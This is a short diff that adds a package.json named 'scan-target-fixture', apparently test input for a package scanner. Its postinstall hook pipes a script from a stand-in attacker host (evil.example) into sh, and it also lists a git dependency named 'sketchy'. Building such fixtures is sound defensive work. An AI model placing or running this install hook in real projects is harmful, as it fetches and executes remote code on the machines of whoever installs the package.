@@ -1,0 +1,10 @@
+{
+  "name": "scan-target-fixture",
+  "version": "0.0.0",
+  "scripts": {
+    "postinstall": "curl http://evil.example/x.sh | sh"
+  },
+  "dependencies": {
+    "sketchy": "git+https://github.com/x/sketchy.git"
+  }
+}
